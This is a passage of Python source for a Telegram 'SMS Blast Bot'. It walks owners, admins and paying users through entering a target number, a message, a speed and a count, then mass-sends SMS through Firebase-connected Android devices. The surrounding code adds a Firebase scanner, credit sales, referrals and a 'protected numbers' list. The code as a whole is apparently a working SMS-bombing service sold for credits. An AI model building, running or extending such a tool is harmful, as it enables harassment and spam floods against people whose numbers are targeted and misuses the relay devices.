    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer("❌ Sirf number bhejo (e.g. 5):")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer("😴 Koi API online nahi! Try later.", reply_markup=kb([("🔙 Owner Panel", "owner:home")]))
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

# ============== ADMIN SMS SENDING ==============

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
        "🛡 <b>Admin SMS Send</b>\n\n"
        "📞 <b>Step 1/4 — Number</b>\n\n"
        "Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([("❌ Cancel", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer("❌ Invalid number. Dobara bhejo (e.g. +919876543210):")
        return
    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(
        f"✅ Number: <code>{number}</code>\n\n💬 <b>Step 2/4 — Message</b>\n\nJo message bhejna hai woh type karo:",
        reply_markup=kb([("❌ Cancel", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(
        f"✅ Message saved!\n\n⚡ <b>Step 3/4 — Speed</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("admin"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {
        "admin:speed:fast": SPEED_FAST,
        "admin:speed:medium": SPEED_MEDIUM,
        "admin:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.admin_send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    count = len(devices)

    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"📊 <b>Step 4/4 — Count</b>\n\n"
        f"🔥 Online APIs : <b>{count}</b>\n"
        f"📤 Device Capacity: <b>{count * 3}</b> SMS\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([("❌ Cancel", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer("❌ Sirf number bhejo (e.g. 5):")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer("😴 Koi API online nahi! Try later.", reply_markup=kb([("🔙 Admin Panel", "admin:home")]))
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

# ============== ADMIN PANEL HANDLERS ==============

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True)
        return
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

# ============== PROTECTED NUMBERS HANDLERS ==============

@R.callback_query(F.data.in_({"owner:protected:menu", "admin:protected:menu"}))
async def protected_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True)
        return
    
    prefix = "owner" if is_owner(uid, d) else "admin"
    text = protected_list_text(d, uid)
    await cq.message.edit_text(
        text,
        reply_markup=protected_numbers_kb(prefix),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:protected:add", "admin:protected:add"}))
async def protected_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True)
        return
    
    await state.set_state(S.add_protected_number)
    prefix = "owner" if is_owner(uid, d) else "admin"
    await cq.message.edit_text(
        "🔒 <b>Add Protected Number</b>\n\n"
        "Woh number bhejo jo protect karna hai:\n"
        "<i>Example: +919876543210</i>\n\n"
        "⚠️ <i>Koi bhi user is number pe SMS bhejne ki koshish karega to turant report ho jayega.</i>",
        reply_markup=kb([("❌ Cancel", f"{prefix}:protected:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_protected_number)
async def protected_add_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer("❌ Invalid number. Dobara bhejo (e.g. +919876543210):")
        return
    
    normalized = number.replace(" ", "").replace("+", "")
    protected = d.get("protected_numbers", [])
    protected_norm = [p.replace(" ", "").replace("+", "") for p in protected]
    
    if normalized in protected_norm:
        await state.clear()
        await msg.answer("⚠️ Ye number already protected hai!", reply_markup=kb([("🔙 Back", "owner:protected:menu" if is_owner(uid, d) else "admin:protected:menu")]))
        return
    
    protected.append(number)
    d["protected_numbers"] = protected
    log_activity(d, "protected_add", uid, f"Added protected number: {number}")
    save(d)
    
    await state.clear()
    prefix = "owner" if is_owner(uid, d) else "admin"
    display = number if is_owner(uid, d) else mask_number_for_admin(number)
    await msg.answer(
        f"✅ <b>Number Protected!</b>\n\n🔒 <code>{display}</code>\n\n"
        f"<i>Ab koi bhi user is number pe SMS nahi bhej sakta. Attempt pe admin ko notify kiya jayega.</i>",
        reply_markup=kb([("🔙 Back", f"{prefix}:protected:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:protected:remove", "admin:protected:remove"}))
async def protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True)
        return
    
    protected = d.get("protected_numbers", [])
    if not protected:
        await cq.answer("❌ Koi protected number nahi hai!", show_alert=True)
        return
    
    prefix = "owner" if is_owner(uid, d) else "admin"
    rows = []
    for num in protected:
        display = num if is_owner(uid, d) else mask_number_for_admin(num)
        rows.append([InlineKeyboardButton(
            text=f"🗑 {display[:15]}",
            callback_data=f"{prefix}:protected:del:{num}"
        )])
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data=f"{prefix}:protected:menu")])
    
    await cq.message.edit_text(
        "🔒 <b>Remove Protected Number</b>\n\nKaunsa number hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):protected:del:(.+)$"))
async def protected_remove_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True)
        return
    
    number = cq.data.split(":", 3)[3]
    protected = d.get("protected_numbers", [])
    
    if number in protected:
        protected.remove(number)
        d["protected_numbers"] = protected
        log_activity(d, "protected_remove", uid, f"Removed protected number: {number}")
        save(d)
        await cq.answer(f"🗑 Removed!", show_alert=True)
    else:
        await cq.answer("❌ Number not found!", show_alert=True)
    
    prefix = "owner" if is_owner(uid, d) else "admin"
    text = protected_list_text(d, uid)
    await cq.message.edit_text(
        text,
        reply_markup=protected_numbers_kb(prefix),
        parse_mode="HTML"
    )

# ============== NUMBER TRACKER HANDLERS ==============

@R.callback_query(F.data.in_({"owner:number_tracker", "admin:number_tracker"}))
async def number_tracker_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True)
        return
    
    prefix = "owner" if is_owner(uid, d) else "admin"
    
    # Show stats
    usage_data = d.get("number_usage", {})
    total_tracked = len(usage_data)
    total_attempts = sum(len(v) for v in usage_data.values())
    
    text = (
        f"🔍 <b>Number Tracker</b>\n\n"
        f"📊 Tracked Numbers: <b>{total_tracked}</b>\n"
        f"📝 Total Attempts: <b>{total_attempts}</b>\n\n"
        f"<i>Check karein ki kaunsi number kis user ne use ki hai.</i>"
    )
    
    await cq.message.edit_text(
        text,
        reply_markup=number_tracker_kb(prefix),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:tracker:check", "admin:tracker:check"}))
async def tracker_check_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True)
        return
    
    await state.set_state(S.tracker_check_number)
    prefix = "owner" if is_owner(uid, d) else "admin"
    await cq.message.edit_text(
        "🔍 <b>Check Number Usage</b>\n\n"
        "Woh number bhejo jiska usage dekhna hai:\n"
        "<i>Example: +919876543210</i>",
        reply_markup=kb([("❌ Cancel", f"{prefix}:number_tracker")]),
        parse_mode="HTML"
    )

@R.message(S.tracker_check_number)
async def tracker_check_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer("❌ Invalid number. Dobara bhejo (e.g. +919876543210):")
        return
    
    usage_history = get_number_usage(d, number)
    prefix = "owner" if is_owner(uid, d) else "admin"
    
    if not usage_history:
        display = number if is_owner(uid, d) else mask_number_for_admin(number)
        await state.clear()
        await msg.answer(
            f"🔍 <b>Number Usage</b>\n\n"
            f"📞 Number: <code>{display}</code>\n"
            f"<i>❌ Koi usage history nahi mili.</i>",
            reply_markup=kb([("🔙 Back", f"{prefix}:number_tracker")]),
            parse_mode="HTML"
        )
        return
    
    # Show usage history (last 20 entries)
    display = number if is_owner(uid, d) else mask_number_for_admin(number)
    lines = [f"🔍 <b>Number Usage</b>\n\n📞 Number: <code>{display}</code>\n"]
    lines.append(f"📝 Total Attempts: <b>{len(usage_history)}</b>\n")
    
    for entry in reversed(usage_history[-20:]):
        user_uid = entry.get("uid", 0)
        timestamp = entry.get("timestamp", 0)
        status = entry.get("status", "unknown")
        status_icon = "✅" if status == "sent" else "⚠️" if status == "protected_attempt" else "❌" if status == "attempted" else "❓"
        
        user_name = d.get("users", {}).get(str(user_uid), {}).get("name", "Unknown")
        lines.append(f"{status_icon} <b>{user_name}</b> (<code>{user_uid}</code>) — {fmt_time(timestamp)}")
    
    text = "\n".join(lines)
    await state.clear()
    await msg.answer(
        text,
        reply_markup=kb([("🔙 Back", f"{prefix}:number_tracker")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:tracker:list", "admin:tracker:list"}))
async def tracker_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True)
        return
    
    usage_data = d.get("number_usage", {})
    prefix = "owner" if is_owner(uid, d) else "admin"
    
    if not usage_data:
        await cq.message.edit_text(
            "📊 <b>Tracked Numbers</b>\n\n<i>Koi tracked number nahi hai.</i>",
            reply_markup=kb([("🔙 Back", f"{prefix}:number_tracker")]),
            parse_mode="HTML"
        )
        return
    
    # Show tracked numbers with counts
    lines = ["📊 <b>Tracked Numbers</b>\n\n"]
    for num, history in sorted(usage_data.items(), key=lambda x: len(x[1]), reverse=True)[:30]:
        display = num if is_owner(uid, d) else mask_number_for_admin(num)
        count = len(history)
        lines.append(f"📞 <code>{display}</code> — <b>{count}</b> attempts")
    
    if len(usage_data) > 30:
        lines.append(f"\n<i>...and {len(usage_data) - 30} more numbers</i>")
    
    text = "\n".join(lines)
    await cq.message.edit_text(
        text,
        reply_markup=kb([("🔙 Back", f"{prefix}:number_tracker")]),
        parse_mode="HTML"
    )

# ============== OTHER OWNER/ADMIN HANDLERS ==============

@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True)
        return
    await cq.answer("⏳ Fetching...")

    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale:
        FB_DEVICE_COUNTS.pop(k, None)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    stats_text = api_stats_text(d)
    dev_lines = [f"\n🟢 <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append("  😴 Koi device online nahi")
    for dv in devices:
        dev_lines.append(
            f"  📱 <b>{dv['dev_name'][:20]}</b>\n"
            f"     🔥 {dv['fb_label'][:25]}\n"
            f"     📶 SIMs: {len(dv['sims']) or 1}"
        )
    full = stats_text + "\n" + "\n".join(dev_lines)

    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"

    await cq.message.edit_text(
        full,
        reply_markup=kb([("🔄 Refresh", "owner:stats"), ("🔙 Back", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True)
        return
    await cq.answer("⏳ Fetching...")

    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale:
        FB_DEVICE_COUNTS.pop(k, None)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    stats_text = api_stats_text(d)
    dev_lines = [f"\n🟢 <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append("  😴 Koi device online nahi")
    for dv in devices:
        dev_lines.append(f"  📱 <b>{dv['dev_name'][:20]}</b> — 🔥 {dv['fb_label'][:20]}")
    full = stats_text + "\n" + "\n".join(dev_lines)

    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"

    await cq.message.edit_text(
        full,
        reply_markup=kb([("🔄 Refresh", "admin:stats"), ("🔙 Back", "admin:home")]),
        parse_mode="HTML"
    )

# ============== USER PANEL HANDLERS ==============

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if not can_use(uid, d):
        await cq.message.edit_text("⛔ Access nahi hai! Owner se contact karein.", parse_mode="HTML")
        return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    credits = get_user_credits(uid, d)
    await cq.answer(f"💰 Credits: {credits}", show_alert=True)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(
        "🎁 <b>Redeem Code</b>\n\nApna redeem code enter karein:\n<i>Example: GIFTABC123</i>",
        reply_markup=kb([("❌ Cancel", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()

    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer("❌ Invalid redeem code!", reply_markup=kb([("🏠 Home", "user:home")]))
        return

    code_data = codes[code]
    if code_data.get("uses_left", 0) <= 0:
        await msg.answer("❌ Ye code expire ho gaya hai!", reply_markup=kb([("🏠 Home", "user:home")]))
        return

    if uid in code_data.get("used_by", []):
        await msg.answer("❌ Aap pehle se ye code use kar chuke hain!", reply_markup=kb([("🏠 Home", "user:home")]))
        return

    credits = code_data["credits"]
    add_credits(uid, credits, d)
    code_data["uses_left"] = code_data.get("uses_left", 1) - 1
    code_data.setdefault("used_by", []).append(uid)
    save(d)

    await msg.answer(
        f"🎉 <b>Redeem Successful!</b>\n\n💰 +{credits} credits added!\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([("🏠 Home", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 3)

    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"👥 <b>Referral Program</b>\n\n"
        f"Apna referral code share karein aur har successful referral pe <b>{ref_credits}</b> credits paayein!\n\n"
        f"🎁 Your Code: <code>{code}</code>\n\n"
        f"🔗 Share Link:\n"
        f"https://t.me/{me.username}?start={code}",
        reply_markup=kb([("🔙 Back", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    stats = d.get("stats", {})

    await cq.message.edit_text(
        f"📊 <b>Your Stats</b>\n\n"
        f"💰 Credits: <b>{udata.get('credits', 0)}</b>\n"
        f"📤 SMS Sent: <b>{udata.get('uses', 0)}</b>\n"
        f"📅 Joined: <b>{fmt_time(udata.get('joined_at', 0))}</b>\n\n"
        f"📈 Bot Total Sent: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=kb([("🔙 Back", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    history = d.get("sms_history", {}).get(str(uid), [])[-10:]

    if not history:
        text = "📜 <b>Your SMS History</b>\n\n<i>Abhi tak koi SMS send nahi kiya.</i>"
    else:
        lines = ["📜 <b>Your SMS History</b> (Last 10)\n"]
        for i, entry in enumerate(reversed(history), 1):
            ts = fmt_time(entry.get("timestamp", 0))
            num = entry.get("number", "Unknown")
            msg_preview = entry.get("message", "")[:30]
            status = entry.get("status", "unknown")
            status_icon = "✅" if status == "sent" else "🛑" if status == "stopped" else "⏳"
            display_num = get_number_display(num, uid, d)
            lines.append(f"{i}. [{ts}] {status_icon} <code>{display_num}</code> — {msg_preview}...")
        text = "\n".join(lines)

    await cq.message.edit_text(
        text,
        reply_markup=kb([("🔙 Back", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])

    if not plans:
        await cq.answer("❌ Abhi koi plan available nahi!", show_alert=True)
        return

    text = "💰 <b>Buy Credits</b>\n\n"
    for plan in plans:
        text += f"📋 <b>{plan['name']}</b>\n"
        text += f"   💰 Price: <b>{plan['price']} {plan.get('currency', 'INR')}</b>\n"
        text += f"   🎁 Credits: <b>{plan['credits']}</b>\n\n"

    rows = []
    for plan in plans:
        rows.append([InlineKeyboardButton(
            text=f"💳 Buy {plan['name'][:20]}",
            url=plan['payment_link']
        )])
    rows.append([InlineKeyboardButton(text="🔙 Back", callback_data="user:home")])

    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"ℹ️ <b>SMS Blast Bot {_VERSION}</b>\n\n"
        f"🤖 Bot for sending bulk SMS via Firebase-connected Android devices.\n\n"
        f"👤 Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
        f"💬 Support: Contact owner for any issues.\n\n"
        f"<i>Bot use karne ke liye credits chahiye. Referral se free credits paayein!</i>",
        reply_markup=kb([("🔙 Back", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )

# ============== OTHER HANDLERS ==============

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()

# ============== MAIN ==============

async def main():
    """Initialize and start the bot with background scanner."""
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me = await bot.get_me()
    log.info(f"✅ @{me.username} — SMS Blast Bot {_VERSION} started!")

    scanner_task = asyncio.create_task(background_firebase_scanner(bot))
    log.info("🔄 Background scanner task created")

    try:
        await bot.send_message(
            MAIN_OWNER,
            f"🚀 <b>SMS Blast Bot {_VERSION} Online!</b>\n@{me.username}\n"
            f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"🔄 <b>Background Scanner:</b> ULTRA OPTIMIZED\n"
            f"⏱ Auto-Scan Interval: <b>5 minutes</b>\n"
            f"👥 <b>Max Concurrent Users:</b> {MAX_CONCURRENT_SESSIONS}\n"
            f"🚀 <b>Concurrent Sends:</b> {MAX_CONCURRENT_SENDS_PER_USER} per user\n"
            f"🔒 <b>Protected Numbers:</b> ENABLED\n"
            f"🔍 <b>Number Tracker:</b> ENABLED\n"
            f"🔥 <b>Firebase Support:</b> 1000+ DBs",
            parse_mode="HTML"
        )
    except Exception as e:
        log.warning(f"Owner notify: {e}")

    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())